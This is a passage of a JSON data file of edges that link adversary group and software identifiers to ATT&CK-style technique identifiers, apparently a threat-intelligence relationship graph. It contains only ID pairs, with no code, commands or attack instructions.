            "source": "S0013",
            "target": "T1106"
        },
        {
            "source": "S0013",
            "target": "T1105"
        },
        {
            "source": "S0013",
            "target": "T1095"
        },
        {
            "source": "S0013",
            "target": "T1094"
        },
        {
            "source": "S0013",
            "target": "T1083"
        },
        {
            "source": "S0013",
            "target": "T1057"
        },
        {
            "source": "S0013",
            "target": "T1049"
        },
        {
            "source": "S0013",
            "target": "T1043"
        },
        {
            "source": "S0013",
            "target": "T1026"
        },
        {
            "source": "S0013",
            "target": "T1012"
        },
        {
            "source": "G0129",
            "target": "S0013"
        },
        {
            "source": "S0012",
            "target": "T1547.014"
        },
        {
            "source": "S0012",
            "target": "T1573.001"
        },
        {
            "source": "S0012",
            "target": "T1074.001"
        },
        {
            "source": "S0012",
            "target": "T1059.003"
        },
        {
            "source": "S0012",
            "target": "T1056.001"
        },
        {
            "source": "S0012",
            "target": "T1547.001"
        },
        {
            "source": "S0012",
            "target": "T1543.003"
        },
        {
            "source": "S0012",
            "target": "T1055.001"
        },
        {
            "source": "S0012",
            "target": "T1112"
        },
        {
            "source": "S0012",
            "target": "T1105"
        },
        {
            "source": "S0012",
            "target": "T1065"
        },
        {
            "source": "S0012",
            "target": "T1027"
        },
        {
            "source": "S0012",
            "target": "T1014"
        },
        {
            "source": "S0012",
            "target": "T1010"
        },
        {
            "source": "S0012",
            "target": "T1005"
        },
        {
            "source": "G0129",
            "target": "S0012"
        },
        {
            "source": "S0483",
            "target": "T1573.002"
        },
        {
            "source": "S0483",
            "target": "T1071.001"
        },
        {
            "source": "S0483",
            "target": "T1204.002"
        },
        {
            "source": "S0483",
            "target": "T1059.005"
        },
        {
            "source": "S0483",
            "target": "T1566.001"
        },
        {
            "source": "S0483",
            "target": "T1087.002"
        },
        {
            "source": "S0483",
            "target": "T1027.003"
        },
        {
            "source": "S0483",
            "target": "T1027.002"
        },
        {
            "source": "S0483",
            "target": "T1218.007"
        },
        {
            "source": "S0483",
            "target": "T1547.001"
        },
        {
            "source": "S0483",
            "target": "T1055.004"
        },
        {
            "source": "S0483",
            "target": "T1053.005"
        },
        {
            "source": "S0483",
            "target": "T1185"
        },
        {
            "source": "S0483",
            "target": "T1106"
        },
        {
            "source": "S0483",
            "target": "T1105"
        },
        {
            "source": "S0483",
            "target": "T1082"
        },
        {
            "source": "S0483",
            "target": "T1069"
        },
        {
            "source": "S0483",
            "target": "T1047"
        },
        {
            "source": "S0483",
            "target": "T1027"
        },
        {
            "source": "G0127",
            "target": "S0483"
        },
        {
            "source": "S0476",
            "target": "T1555.004"
        },
        {
            "source": "S0476",
            "target": "T1059.007"
        },
        {
            "source": "S0476",
            "target": "T1071.001"
        },
        {
            "source": "S0476",
            "target": "T1132.001"
        },
        {
            "source": "S0476",
            "target": "T1564.004"
        },
        {
            "source": "S0476",
            "target": "T1204.002"
        },
        {
            "source": "S0476",
            "target": "T1059.001"
        },
        {
            "source": "S0476",
            "target": "T1566.002"
        },
        {
            "source": "S0476",
            "target": "T1566.001"
        },
        {
            "source": "S0476",
            "target": "T1518.001"
        },
        {
            "source": "S0476",
            "target": "T1087.002"
        },
        {
            "source": "S0476",
            "target": "T1087.001"
        },
        {
            "source": "S0476",
            "target": "T1114.002"
        },
        {
            "source": "S0476",
            "target": "T1559.002"
        },
        {
            "source": "S0476",
            "target": "T1027.002"
        },
        {
            "source": "S0476",
            "target": "T1552.002"
        },
        {
            "source": "S0476",
            "target": "T1218.010"
        },
        {
            "source": "S0476",
            "target": "T1053.005"
        },
        {
            "source": "S0476",
            "target": "T1140"
        },
        {
            "source": "S0476",
            "target": "T1119"
        },
        {
            "source": "S0476",
            "target": "T1113"
        },
        {
            "source": "S0476",
            "target": "T1112"
        },
        {
            "source": "S0476",
            "target": "T1105"
        },
        {
            "source": "S0476",
            "target": "T1104"
        },
        {
            "source": "S0476",
            "target": "T1082"
        },
        {
            "source": "S0476",
            "target": "T1057"
        },
        {
            "source": "S0476",
            "target": "T1047"
        },
        {
            "source": "S0476",
            "target": "T1041"
        },
        {
            "source": "S0476",
            "target": "T1033"
        },
        {
            "source": "S0476",
            "target": "T1027"
        },
        {
            "source": "S0476",
            "target": "T1016"
        },
        {
            "source": "S0476",
            "target": "T1012"
        },
        {
            "source": "S0476",
            "target": "T1008"
        },
        {
            "source": "G0127",
            "target": "S0476"
        },
        {
            "source": "S0386",
            "target": "T1071.001"
        },
        {
            "source": "S0386",
            "target": "T1090.003"
        },
        {
            "source": "S0386",
            "target": "T1074.001"
        },
        {
            "source": "S0386",
            "target": "T1564.003"
        },
        {
            "source": "S0386",
            "target": "T1568.002"
        },
        {
            "source": "S0386",
            "target": "T1059.005"
        },
        {
            "source": "S0386",
            "target": "T1059.001"
        },
        {
            "source": "S0386",
            "target": "T1497.003"
        },
        {
            "source": "S0386",
            "target": "T1559.001"
        },
        {
            "source": "S0386",
            "target": "T1056.004"
        },
        {
            "source": "S0386",
            "target": "T1036.005"
        },
        {
            "source": "S0386",
            "target": "T1070.004"
        },
        {
            "source": "S0386",
            "target": "T1547.001"
        },
        {
            "source": "S0386",
            "target": "T1543.003"
        },
        {
            "source": "S0386",
            "target": "T1055.012"
        },
        {
            "source": "S0386",
            "target": "T1055.005"
        },
        {
            "source": "S0386",
            "target": "T1185"
        },
        {
            "source": "S0386",
            "target": "T1140"
        },
        {
            "source": "S0386",
            "target": "T1132"
        },
        {
            "source": "S0386",
            "target": "T1113"
        },
        {
            "source": "S0386",
            "target": "T1112"
        },
        {
            "source": "S0386",
            "target": "T1106"
        },
        {
            "source": "S0386",
            "target": "T1105"
        },
        {
            "source": "S0386",
            "target": "T1094"
        },
        {
            "source": "S0386",
            "target": "T1091"
        },
        {
            "source": "S0386",
            "target": "T1090"
        },
        {
            "source": "S0386",
            "target": "T1082"
        },
        {
            "source": "S0386",
            "target": "T1080"
        },
        {
            "source": "S0386",
            "target": "T1057"
        },
        {
            "source": "S0386",
            "target": "T1047"
        },
        {
            "source": "S0386",
            "target": "T1041"
        },
        {
            "source": "S0386",
            "target": "T1027"
        },
        {
            "source": "S0386",
            "target": "T1012"
        },
        {
            "source": "S0386",
            "target": "T1007"
        },
        {
            "source": "S0386",
            "target": "T1005"
        },
        {
            "source": "G0127",
            "target": "S0386"
        },
        {
            "source": "S0160",
            "target": "T1553.004"
        },
        {
            "source": "S0160",
            "target": "T1140"
        },
        {
            "source": "S0160",
            "target": "T1105"
        },
        {
            "source": "G0126",
            "target": "S0160"
        },
        {
            "source": "S0032",
            "target": "T1573.001"
        },
        {
            "source": "S0032",
            "target": "T1573"
        },
        {
            "source": "S0032",
            "target": "T1132.001"
        },
        {
            "source": "S0032",
            "target": "T1574.002"
        },
        {
            "source": "S0032",
            "target": "T1568.001"
        },
        {
            "source": "S0032",
            "target": "T1569.002"
        },
        {
            "source": "S0032",
            "target": "T1056.001"
        },
        {
            "source": "S0032",
            "target": "T1070.004"
        },
        {
            "source": "S0032",
            "target": "T1070.001"
        },
        {
            "source": "S0032",
            "target": "T1547.001"
        },
        {
            "source": "S0032",
            "target": "T1218.011"
        },
        {
            "source": "S0032",
            "target": "T1543.003"
        },
        {
            "source": "S0032",
            "target": "T1140"
        },
        {
            "source": "S0032",
            "target": "T1129"
        },
        {
            "source": "S0032",
            "target": "T1113"
        },
        {
            "source": "S0032",
            "target": "T1112"
        },
        {
            "source": "S0032",
            "target": "T1106"
        },
        {
            "source": "S0032",
            "target": "T1105"
        },
        {
            "source": "S0032",
            "target": "T1095"
        },
        {
            "source": "S0032",
            "target": "T1082"
        },
        {
            "source": "S0032",
            "target": "T1059"
        },
        {
            "source": "S0032",
            "target": "T1057"
        },
        {
            "source": "S0032",
            "target": "T1055"
        },
        {
            "source": "S0032",
            "target": "T1012"
        },
        {
            "source": "G0126",
            "target": "S0032"
        },
        {
            "source": "G0126",
            "target": "S0013"
        },
        {
            "source": "S0073",
            "target": "T1505.003"
        },
        {
            "source": "G0125",
            "target": "S0073"
        },
        {
            "source": "S0029",
            "target": "T1570"
        },
        {
            "source": "S0029",
            "target": "T1569.002"
        },
        {
            "source": "S0029",
            "target": "T1021.002"
        },
        {
            "source": "G0125",
            "target": "S0029"
        },
        {
            "source": "S0020",
            "target": "T1071.001"
        },
        {
            "source": "S0020",
            "target": "T1059.003"
        },
        {
            "source": "S0020",
            "target": "T1110.001"
        },
        {
            "source": "S0020",
            "target": "T1027.002"
        },
        {
            "source": "S0020",
            "target": "T1070.006"
        },
        {
            "source": "S0020",
            "target": "T1505.003"
        },
        {
            "source": "S0020",
            "target": "T1105"
        },
        {
            "source": "S0020",
            "target": "T1083"
        },
        {
            "source": "S0020",
            "target": "T1046"
        },
        {
            "source": "S0020",
            "target": "T1005"
        },
        {
            "source": "G0125",
            "target": "S0020"
        },
        {
            "source": "S0377",
            "target": "T1556.003"
        },
        {
            "source": "S0377",
            "target": "T1562.006"
        },
        {
            "source": "S0377",
            "target": "T1573.001"
        },
        {
            "source": "S0377",
            "target": "T1071.004"
        },
        {
            "source": "S0377",
            "target": "T1132.001"
        },
        {
            "source": "S0377",
            "target": "T1574.006"
        },
        {
            "source": "S0377",
            "target": "T1568.002"
        },
        {
            "source": "S0377",
            "target": "T1059.006"
        },
        {
            "source": "S0377",
            "target": "T1562.001"
        },
        {
            "source": "S0377",
            "target": "T1556"
        },
        {
            "source": "S0377",
            "target": "T1554"
        },
        {
            "source": "S0377",
            "target": "T1553.002"
        },
        {
            "source": "S0377",
            "target": "T1552.004"
        },
        {
            "source": "S0377",
            "target": "T1140"
        },
        {
            "source": "S0377",
            "target": "T1083"
        },
        {
            "source": "S0377",
            "target": "T1041"
        },
        {
            "source": "S0377",
            "target": "T1027"
        },
        {
            "source": "S0377",
            "target": "T1020"
        },
        {
            "source": "S0377",
            "target": "T1014"
        },
        {
            "source": "S0377",
            "target": "T1008"
        },
        {
            "source": "G0124",
            "target": "S0377"
        },
        {
            "source": "S0572",
            "target": "T1069.001"
        },
        {
            "source": "S0572",
            "target": "T1059.003"
        },
        {
            "source": "S0572",
            "target": "T1112"
        },
        {
            "source": "S0572",
            "target": "T1110"
        },
        {
            "source": "S0572",
            "target": "T1105"
        },
        {
            "source": "S0572",
            "target": "T1083"
        },
        {
            "source": "S0572",
            "target": "T1082"
        },
        {
            "source": "S0572",
            "target": "T1057"
        },
        {
            "source": "S0572",
            "target": "T1046"
        },
        {
            "source": "S0572",
            "target": "T1041"
        },
        {
            "source": "S0572",
            "target": "T1033"
        },
        {
            "source": "S0572",
            "target": "T1016"
        },
        {
            "source": "S0572",
            "target": "T1014"
        },
        {
            "source": "S0572",
            "target": "T1007"
        },
        {
            "source": "S0572",
            "target": "T1005"
        },
        {
            "source": "G0123",
            "target": "S0572"
        },
        {
            "source": "S0569",
            "target": "T1573.001"
        },
        {
            "source": "S0569",
            "target": "T1071.001"
        },
        {
            "source": "S0569",
            "target": "T1564.001"
        },
        {
            "source": "S0569",
            "target": "T1056.001"
        },
        {
            "source": "S0569",
            "target": "T1115"
        },
        {
            "source": "S0569",
            "target": "T1112"
        },
        {
            "source": "S0569",
            "target": "T1106"
        },
        {
            "source": "S0569",
            "target": "T1105"
        },
        {
            "source": "S0569",
            "target": "T1082"
        },
        {
            "source": "S0569",
            "target": "T1033"
        },
        {
            "source": "S0569",
            "target": "T1025"
        },
        {
            "source": "S0569",
            "target": "T1016"
        },
        {
            "source": "G0123",
            "target": "S0569"
        },
        {
            "source": "S0250",
            "target": "T1573.002"
        },
        {
            "source": "S0250",
            "target": "T1569.002"
        },
        {
            "source": "S0250",
            "target": "T1059.005"
        },
        {
            "source": "S0250",
            "target": "T1059.003"
        },
        {
            "source": "S0250",
            "target": "T1003.003"
        },
        {
            "source": "S0250",
            "target": "T1003.002"
        },
        {
            "source": "S0250",
            "target": "T1021.001"
        },
        {
            "source": "S0250",
            "target": "T1548.002"
        },
        {
            "source": "S0250",
            "target": "T1218.010"
        },
        {
            "source": "S0250",
            "target": "T1218.005"
        },
        {
            "source": "S0250",
            "target": "T1218.011"
        },
        {
            "source": "S0250",
            "target": "T1055.001"
        },
        {
            "source": "S0250",
            "target": "T1135"
        },
        {
            "source": "S0250",
            "target": "T1115"
        },
        {
            "source": "S0250",
            "target": "T1105"
        },
        {
            "source": "S0250",
            "target": "T1047"
        },
        {
            "source": "S0250",
            "target": "T1046"
        },
        {
            "source": "S0250",
            "target": "T1033"
        },
        {
            "source": "S0250",
            "target": "T1016"
        },
        {
            "source": "S0250",
            "target": "T1005"
        },
        {
            "source": "G0121",
            "target": "S0250"
        },
        {
            "source": "S0568",
            "target": "T1102.003"
        },
        {
            "source": "S0568",
            "target": "T1518.001"
        },
        {
            "source": "S0568",
            "target": "T1070.006"
        },
        {
            "source": "S0568",
            "target": "T1547.001"
        },
        {
            "source": "S0568",
            "target": "T1218.010"
        },
        {
            "source": "S0568",
            "target": "T1218.011"
        },
        {
            "source": "S0568",
            "target": "T1539"
        },
        {
            "source": "S0568",
            "target": "T1112"
        },
        {
            "source": "S0568",
            "target": "T1105"
        },
        {
            "source": "S0568",
            "target": "T1082"
        },
        {
            "source": "S0568",
            "target": "T1070"
        },
        {
            "source": "S0568",
            "target": "T1047"
        },
        {
            "source": "S0568",
            "target": "T1041"
        },
        {
            "source": "S0568",
            "target": "T1033"
        },
        {
            "source": "G0120",
            "target": "S0568"
        },
        {
            "source": "S0349",
            "target": "T1555.004"
        },
        {
            "source": "S0349",
            "target": "T1003.004"
        },
        {
            "source": "S0349",
            "target": "T1003.005"
        },
        {
            "source": "S0349",
            "target": "T1555.003"
        },
        {
            "source": "S0349",
            "target": "T1555.001"
        },
        {
            "source": "S0349",
            "target": "T1555"
        },
        {
            "source": "S0349",
            "target": "T1003.008"
        },
        {
            "source": "S0349",
            "target": "T1003.007"
        },
        {
            "source": "S0349",
            "target": "T1003.001"
        },
        {
            "source": "S0349",
            "target": "T1552.001"
        },
        {
            "source": "G0120",
            "target": "S0349"
        },
        {
            "source": "S0284",
            "target": "T1016.001"
        },
        {
            "source": "S0284",
            "target": "T1573.001"
        },
        {
            "source": "S0284",
            "target": "T1071.001"
        },
        {
            "source": "S0284",
            "target": "T1132.001"
        },
        {
            "source": "S0284",
            "target": "T1059.003"
        },
        {
            "source": "S0284",
            "target": "T1518.001"
        },
        {
            "source": "S0284",
            "target": "T1553.002"
        },
        {
            "source": "S0284",
            "target": "T1070.004"
        },
        {
            "source": "S0284",
            "target": "T1218.010"
        },
        {
            "source": "S0284",
            "target": "T1140"
        },
        {
            "source": "S0284",
            "target": "T1105"
        },
        {
            "source": "S0284",
            "target": "T1082"
        },
        {
            "source": "S0284",
            "target": "T1033"
        },
        {
            "source": "S0284",
            "target": "T1027"
        },
        {
            "source": "S0284",
            "target": "T1016"
        },
        {
            "source": "G0120",
            "target": "S0284"
        },
        {
            "source": "S0570",
            "target": "T1564.004"
        },
        {
            "source": "S0570",
            "target": "T1087.001"
        },
        {
            "source": "S0570",
            "target": "T1134.001"
        },
        {
            "source": "S0570",
            "target": "T1222.001"
        },
        {
            "source": "S0570",
            "target": "T1070.006"
        },
        {
            "source": "S0570",
            "target": "T1548.002"
        },
        {
            "source": "S0570",
            "target": "T1547.001"
        },
        {
            "source": "S0570",
            "target": "T1543.003"
        },
        {
            "source": "S0570",
            "target": "T1490"
        },
        {
            "source": "S0570",
            "target": "T1486"
        },
        {
            "source": "S0570",
            "target": "T1480"
        },
        {
            "source": "S0570",
            "target": "T1135"
        },
        {
            "source": "S0570",
            "target": "T1112"
        },
        {
            "source": "S0570",
            "target": "T1106"
        },
        {
            "source": "S0570",
            "target": "T1027"
        },
        {
            "source": "S0570",
            "target": "T1018"
        },
        {
            "source": "S0570",
            "target": "T1012"
        },
        {
            "source": "S0570",
            "target": "T1007"
        },
        {
            "source": "G0119",
            "target": "S0570"
        },
        {
            "source": "S0384",
            "target": "T1573.002"
        },
        {
            "source": "S0384",
            "target": "T1573.001"
        },
        {
            "source": "S0384",
            "target": "T1071.001"
        },
        {
            "source": "S0384",
            "target": "T1219"
        },
        {
            "source": "S0384",
            "target": "T1185"
        },
        {
            "source": "S0384",
            "target": "T1090"
        },
        {
            "source": "G0119",
            "target": "S0384"
        },
        {
            "source": "S0363",
            "target": "T1484.001"
        },
        {
            "source": "S0363",
            "target": "T1127.001"
        },
        {
            "source": "S0363",
            "target": "T1573.002"
        },
        {
            "source": "S0363",
            "target": "T1574.004"
        },
        {
            "source": "S0363",
            "target": "T1071.001"
        },
        {
            "source": "S0363",
            "target": "T1102.002"
        },
        {
            "source": "S0363",
            "target": "T1574.001"
        },
        {
            "source": "S0363",
            "target": "T1574.008"
        },
        {
            "source": "S0363",
            "target": "T1574.007"
        },
        {
            "source": "S0363",
            "target": "T1574.009"
        },
        {
            "source": "S0363",
            "target": "T1569.002"
        },
        {
            "source": "S0363",
            "target": "T1567.002"
        },
        {
            "source": "S0363",
            "target": "T1567.001"
        },
        {
            "source": "S0363",
            "target": "T1059.003"
        },
        {
            "source": "S0363",
            "target": "T1059.001"
        },
        {
            "source": "S0363",
            "target": "T1518.001"
        },
        {
            "source": "S0363",
            "target": "T1087.002"
        },
        {
            "source": "S0363",
            "target": "T1087.001"
        },
        {
            "source": "S0363",
            "target": "T1560"
        },
        {
            "source": "S0363",
            "target": "T1114.001"
        },
        {
            "source": "S0363",
            "target": "T1134.005"
        },
        {
            "source": "S0363",
            "target": "T1134.002"
        },
        {
            "source": "S0363",
            "target": "T1555.003"
        },
        {
            "source": "S0363",
            "target": "T1558.002"
        },
        {
            "source": "S0363",
            "target": "T1558.001"
        },
        {
            "source": "S0363",
            "target": "T1557.001"
        },
        {
            "source": "S0363",
            "target": "T1056.004"
        },
        {
            "source": "S0363",
            "target": "T1056.001"
        },
        {
            "source": "S0363",
            "target": "T1558.003"
        },
        {
            "source": "S0363",
            "target": "T1003.001"
        },
        {
            "source": "S0363",
            "target": "T1021.004"
        },
        {
            "source": "S0363",
            "target": "T1021.003"
        },
        {
            "source": "S0363",
            "target": "T1552.004"
        },
        {
            "source": "S0363",
            "target": "T1552.001"
        },
        {
            "source": "S0363",
            "target": "T1070.006"
        },
        {
            "source": "S0363",
            "target": "T1550.002"
        },
        {
            "source": "S0363",
            "target": "T1548.002"
        },
        {
            "source": "S0363",
            "target": "T1136.002"
        },
        {
            "source": "S0363",
            "target": "T1136.001"
        },
        {
            "source": "S0363",
            "target": "T1547.009"
        },
        {
            "source": "S0363",
            "target": "T1547.005"
        },
        {
            "source": "S0363",
            "target": "T1546.008"
        },
        {
            "source": "S0363",
            "target": "T1547.001"
        },
        {
            "source": "S0363",
            "target": "T1543.003"
        },
        {
            "source": "S0363",
            "target": "T1053.005"
        },
        {
            "source": "S0363",
            "target": "T1482"
        },
        {
            "source": "S0363",
            "target": "T1210"
        },
        {
            "source": "S0363",
            "target": "T1217"
        },
        {
            "source": "S0363",
            "target": "T1134"
        },
        {
            "source": "S0363",
            "target": "T1135"
        },
        {
            "source": "S0363",
            "target": "T1125"
        },
        {
            "source": "S0363",
            "target": "T1115"
        },
        {
            "source": "S0363",
            "target": "T1113"
        },
        {
            "source": "S0363",
            "target": "T1106"
        },
        {
            "source": "S0363",
            "target": "T1105"
        },
        {
            "source": "S0363",
            "target": "T1083"
        },
        {
            "source": "S0363",
            "target": "T1082"
        },
        {
            "source": "S0363",
            "target": "T1068"
        },
        {
            "source": "S0363",
            "target": "T1059"
        },
        {
            "source": "S0363",
            "target": "T1057"
        },
        {
            "source": "S0363",
            "target": "T1055"
        },
        {
            "source": "S0363",
            "target": "T1049"
        },
        {
            "source": "S0363",
            "target": "T1047"
        },
        {
            "source": "S0363",
            "target": "T1046"
        },
        {
            "source": "S0363",
            "target": "T1043"
        },
        {
            "source": "S0363",
            "target": "T1041"
        },
        {
            "source": "S0363",
            "target": "T1040"
        },
        {
            "source": "S0363",
            "target": "T1027"
        },
        {
            "source": "S0363",
            "target": "T1016"
        },
        {
            "source": "G0119",
            "target": "S0363"
        },
        {
            "source": "S0002",
            "target": "T1555.004"
        },
        {
            "source": "S0002",
            "target": "T1003.004"
        },
        {
            "source": "S0002",
            "target": "T1134.005"
        },
        {
            "source": "S0002",
            "target": "T1555.003"
        },
        {
            "source": "S0002",
            "target": "T1558.002"
        },
        {
            "source": "S0002",
            "target": "T1558.001"
        },
        {
            "source": "S0002",
            "target": "T1555"
        },
        {
            "source": "S0002",
            "target": "T1003.006"
        },
        {
            "source": "S0002",
            "target": "T1003.002"
        },
        {
            "source": "S0002",
            "target": "T1003.001"
        },
        {
            "source": "S0002",
            "target": "T1552.004"
        },
        {
            "source": "S0002",
            "target": "T1550.003"
        },
        {
            "source": "S0002",
            "target": "T1550.002"
        },
        {
            "source": "S0002",
            "target": "T1547.005"
        },
        {
            "source": "S0002",
            "target": "T1207"
        },
        {
            "source": "S0002",
            "target": "T1098"
        },
        {
            "source": "G0119",
            "target": "S0002"
        },
        {
            "source": "S0556",
            "target": "T1573.002"
        },
        {
            "source": "S0556",
            "target": "T1090.001"
        },
        {
            "source": "S0556",
            "target": "T1070.004"
        },
        {
            "source": "S0556",
            "target": "T1489"
        },
        {
            "source": "S0556",
            "target": "T1486"
        },
        {
            "source": "S0556",
            "target": "T1095"
        },
        {
            "source": "S0556",
            "target": "T1082"
        },
        {
            "source": "S0556",
            "target": "T1016"
        },
        {
            "source": "G0117",
            "target": "S0556"
        },
        {
            "source": "S0508",
            "target": "T1572"
        },
        {
            "source": "S0508",
            "target": "T1568.002"
        },
        {
            "source": "S0508",
            "target": "T1567"
        },
        {
            "source": "S0508",
            "target": "T1102"
        },
        {
            "source": "S0508",
            "target": "T1090"
        },
        {
            "source": "G0117",
            "target": "S0508"
        },
        {
            "source": "G0117",
            "target": "S0029"
        },
        {
            "source": "G0117",
            "target": "S0020"
        },
        {
            "source": "S0521",
            "target": "T1069.001"
        },
        {
            "source": "S0521",
            "target": "T1059.001"
        },
        {
            "source": "S0521",
            "target": "T1069.002"
        },
        {
            "source": "S0521",
            "target": "T1087.002"
        },
        {
            "source": "S0521",
            "target": "T1087.001"
        },
        {
            "source": "S0521",
            "target": "T1560"
        },
        {
            "source": "S0521",
            "target": "T1482"
        },
        {
            "source": "S0521",
            "target": "T1201"
        },
        {
            "source": "S0521",
            "target": "T1106"
        },
        {
            "source": "S0521",
            "target": "T1033"
        },
        {
            "source": "S0521",
            "target": "T1018"
        },
        {
            "source": "G0116",
            "target": "S0521"
        },
        {
            "source": "S0357",
            "target": "T1569.002"
        },
        {
            "source": "S0357",
            "target": "T1003.004"
        },
        {
            "source": "S0357",
            "target": "T1557.001"
        },
        {
            "source": "S0357",
            "target": "T1558.003"
        },
        {
            "source": "S0357",
            "target": "T1003.003"
        },
        {
            "source": "S0357",
            "target": "T1003.002"
        },
        {
            "source": "S0357",
            "target": "T1003.001"
        },
        {
            "source": "S0357",
            "target": "T1047"
        },
        {
            "source": "S0357",
            "target": "T1040"
        },
        {
            "source": "G0116",
            "target": "S0357"
        },
        {
            "source": "S0194",
            "target": "T1555.004"
        },
        {
            "source": "S0194",
            "target": "T1027.005"
        },
        {
            "source": "S0194",
            "target": "T1574.001"
        },
        {
            "source": "S0194",
            "target": "T1574.008"
        },
        {
            "source": "S0194",
            "target": "T1574.007"
        },
        {
            "source": "S0194",
            "target": "T1574.009"
        },
        {
            "source": "S0194",
            "target": "T1059.001"
        },
        {
            "source": "S0194",
            "target": "T1087.001"
        },
        {
            "source": "S0194",
            "target": "T1056.001"
        },
        {
            "source": "S0194",
            "target": "T1558.003"
        },
        {
            "source": "S0194",
            "target": "T1552.006"
        },
        {
            "source": "S0194",
            "target": "T1003.001"
        },
        {
            "source": "S0194",
            "target": "T1552.002"
        },
        {
            "source": "S0194",
            "target": "T1547.005"
        },
        {
            "source": "S0194",
            "target": "T1547.001"
        },
        {
            "source": "S0194",
            "target": "T1543.003"
        },
        {
            "source": "S0194",
            "target": "T1055.002"
        },
        {
            "source": "S0194",
            "target": "T1055.001"
        },
        {
            "source": "S0194",
            "target": "T1053.005"
        },
        {
            "source": "S0194",
            "target": "T1482"
        },
        {
            "source": "S0194",
            "target": "T1134"
        },
        {
            "source": "S0194",
            "target": "T1123"
        },
        {
            "source": "S0194",
            "target": "T1113"
        },
        {
            "source": "S0194",
            "target": "T1057"
        },
        {
            "source": "S0194",
            "target": "T1047"
        },
        {
            "source": "S0194",
            "target": "T1034"
        },
        {
            "source": "S0194",
            "target": "T1027"
        },
        {
            "source": "S0194",
            "target": "T1012"
        },
        {
            "source": "S0194",
            "target": "T1005"
        },
        {
            "source": "G0116",
            "target": "S0194"
        },
        {
            "source": "S0105",
            "target": "T1069.002"
        },
        {
            "source": "S0105",
            "target": "T1087.002"
        },
        {
            "source": "S0105",
            "target": "T1482"
        },
        {
            "source": "G0116",
            "target": "S0105"
        },
        {
            "source": "S0104",
            "target": "T1049"
        },
        {
            "source": "G0116",
            "target": "S0104"
        },
        {
            "source": "G0116",
            "target": "S0002"
        },
        {
            "source": "S0591",
            "target": "T1059.001"
        },
        {
            "source": "S0591",
            "target": "T1125"
        },
        {
            "source": "S0591",
            "target": "T1113"
        },
        {
            "source": "G0115",
            "target": "S0591"
        },
        {
            "source": "S0496",
            "target": "T1573.002"
        },
        {
            "source": "S0496",
            "target": "T1071.001"
        },
        {
            "source": "S0496",
            "target": "T1204.002"
        },
        {
            "source": "S0496",
            "target": "T1059.005"
        },
        {
            "source": "S0496",
            "target": "T1059.003"
        },
        {
            "source": "S0496",
            "target": "T1059.001"
        },
        {
            "source": "S0496",
            "target": "T1566.001"
        },
        {
            "source": "S0496",
            "target": "T1069.002"
        },
        {
            "source": "S0496",
            "target": "T1562.001"
        },
        {
            "source": "S0496",
            "target": "T1134.002"
        },
        {
            "source": "S0496",
            "target": "T1134.001"
        },
        {
            "source": "S0496",
            "target": "T1036.005"
        },
        {
            "source": "S0496",
            "target": "T1070.004"
        },
        {
            "source": "S0496",
            "target": "T1490"
        },
        {
            "source": "S0496",
            "target": "T1489"
        },
        {
            "source": "S0496",
            "target": "T1486"
        },
        {
            "source": "S0496",
            "target": "T1485"
        },
        {
            "source": "S0496",
            "target": "T1189"
        },
        {
            "source": "S0496",
            "target": "T1140"
        },
        {
            "source": "S0496",
            "target": "T1112"
        },
        {
            "source": "S0496",
            "target": "T1106"
        },
        {
            "source": "S0496",
            "target": "T1105"
        },
        {
            "source": "S0496",
            "target": "T1083"
        },
        {
            "source": "S0496",
            "target": "T1082"
        },
        {
            "source": "S0496",
            "target": "T1055"
        },
        {
            "source": "S0496",
            "target": "T1047"
        },
        {
            "source": "S0496",
            "target": "T1041"
        },
        {
            "source": "S0496",
            "target": "T1027"
        },
        {
            "source": "S0496",
            "target": "T1012"
        },
        {
            "source": "S0496",
            "target": "T1007"
        },
        {
            "source": "S0496",
            "target": "T0886"
        },
        {
            "source": "S0496",
            "target": "T0853"
        },
        {
            "source": "S0496",
            "target": "T0869"
        },
        {
            "source": "S0496",
            "target": "T0863"
        },
        {
            "source": "S0496",
            "target": "T0828"
        },
        {
            "source": "S0496",
            "target": "T0881"
        },
        {
            "source": "S0496",
            "target": "T0882"
        },
        {
            "source": "S0496",
            "target": "T0849"
        },
        {
            "source": "G0115",
            "target": "S0496"
        },
        {
            "source": "G0115",
            "target": "S0496"
        },
        {
            "source": "G0114",
            "target": "S0521"
        },
        {
            "source": "S0404",
            "target": "T1564.004"
        },
        {
            "source": "S0404",
            "target": "T1570"
        },
        {
            "source": "S0404",
            "target": "T1003.003"
        },
        {
            "source": "S0404",
            "target": "T1105"
        },
        {
            "source": "G0114",
            "target": "S0404"
        },
        {
            "source": "G0114",
            "target": "S0154"
        },
        {
            "source": "S0039",
            "target": "T1069.001"
        },
        {
            "source": "S0039",
            "target": "T1569.002"
        },
        {
            "source": "S0039",
            "target": "T1069.002"
        },
        {
            "source": "S0039",
            "target": "T1087.002"
        },
        {
            "source": "S0039",
            "target": "T1087.001"
        },
        {
            "source": "S0039",
            "target": "T1021.002"
        },
        {
            "source": "S0039",
            "target": "T1070.005"
        },
        {
            "source": "S0039",
            "target": "T1136.002"
        },
        {
            "source": "S0039",
            "target": "T1136.001"
        },
        {
            "source": "S0039",
            "target": "T1201"
        },
        {
            "source": "S0039",
            "target": "T1135"
        },
        {
            "source": "S0039",
            "target": "T1124"
        },
        {
            "source": "S0039",
            "target": "T1049"
        },
        {
            "source": "S0039",
            "target": "T1018"
        },
        {
            "source": "S0039",
            "target": "T1007"
        },
        {
            "source": "G0114",
            "target": "S0039"
        },
        {
            "source": "G0114",
            "target": "S0029"
        },
        {
            "source": "G0114",
            "target": "S0002"
        },
        {
            "source": "S0466",
            "target": "T1071.001"
        },
        {
            "source": "S0466",
            "target": "T1048.003"
        },
        {
            "source": "S0466",
            "target": "T1564.003"
        },
        {
            "source": "S0466",
            "target": "T1059.004"
        },
        {
            "source": "S0466",
            "target": "T1560.001"
        },
        {
            "source": "S0466",
            "target": "T1036.001"
        },
        {
            "source": "S0466",
            "target": "T1070.004"
        },
        {
            "source": "S0466",
            "target": "T1140"
        },
        {
            "source": "S0466",
            "target": "T1124"
        },
        {
            "source": "S0466",
            "target": "T1119"
        },
        {
            "source": "S0466",
            "target": "T1106"
        },
        {
            "source": "S0466",
            "target": "T1083"
        },
        {
            "source": "S0466",
            "target": "T1036"
        },
        {
            "source": "S0466",
            "target": "T1027"
        },
        {
            "source": "G0112",
            "target": "S0466"
        },
        {
            "source": "G0108",
            "target": "S0002"
        },
        {
            "source": "G0107",
            "target": "S0002"
        },
        {
            "source": "S0191",
            "target": "T1569.002"
        },
        {
            "source": "G0105",
            "target": "S0191"
        },
        {
            "source": "G0105",
            "target": "S0029"
        },
        {
            "source": "S0448",
            "target": "T1071.001"
        },
        {
            "source": "S0448",
